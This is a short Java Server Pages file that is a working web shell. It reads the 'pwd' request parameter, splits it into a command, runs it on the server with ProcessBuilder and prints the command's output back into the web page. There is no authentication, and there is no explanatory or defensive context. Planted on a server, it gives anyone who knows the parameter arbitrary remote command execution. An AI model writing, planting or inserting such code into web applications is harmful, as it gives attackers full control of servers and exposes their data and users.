<%@ page language="java" import="java.io.*" pageEncoding="utf-8"%>
<%
    if(request.getParameter("pwd")!=null){
		String[] strs=request.getParameter("pwd").split(" ");
        java.io.InputStream in = new ProcessBuilder(strs).start().getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>